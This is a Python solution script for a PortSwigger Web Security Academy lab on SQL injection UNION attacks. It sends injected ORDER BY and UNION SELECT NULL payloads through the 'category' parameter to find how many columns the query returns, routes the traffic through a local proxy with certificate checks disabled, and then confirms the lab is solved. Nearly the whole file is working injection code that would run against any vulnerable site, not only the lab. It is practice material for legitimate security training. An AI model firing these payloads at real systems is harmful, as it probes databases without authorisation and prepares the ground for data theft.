#!/usr/bin/env python3
# Lab: SQL injection UNION attack, determining the number of columns returned by the query                      # noqa
# Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>  # noqa
# Difficulty: PRACTITIONER
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_orderBy(host):
    url = f'{host}/filter?category=Accessories'
    for i in range(1, 100):
        r = requests.get(url + f"' order by {i}--", verify=False, proxies=proxies)
        if r.status_code != 200:
            return i - 1
    return False


def exploit_UNION(host):
    def get_args(i):
        ret = 'null'
        while i > 1:
            ret += ', null'
            i -= 1
        return ret

    url = f'{host}/filter?category=Accessories'

    for i in range(1, 100):
        r = requests.get(url + f"' UNION SELECT {get_args(i)}--", verify=False, proxies=proxies)
        if r.status_code != 500:
            return i
    return False


if __name__ == "__main__":
    print('[+] SQL injection UNION attack, determining the number of columns returned by the query')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host> ')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print('[ ] Count columns with ORDER BY')
    num_of_columns_orderBy = exploit_orderBy(host)
    if num_of_columns_orderBy:
        print(f'[+] ORDER BY injection successful, found {num_of_columns_orderBy} columns')
    else:
        print('[-] ORDER BY injection not successful')

    num_of_columns_UNION = exploit_UNION(host)
    print(f'[+] Found {num_of_columns_UNION} columns')
    if num_of_columns_UNION:
        print(f'[+] UNION SELECT injection successful')
    else:
        print('[-] UNION SELECT injection not successful')

    if num_of_columns_UNION != num_of_columns_orderBy:
        print('[-] Something fishy goes on')

    # I had some issues getting the 'congratulations' banner.
    # So wait a bit to get it
    time.sleep(2)
    if 'Congratulations, you solved the lab!' not in requests.get(host, verify=False, proxies=proxies, allow_redirects=False).text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')
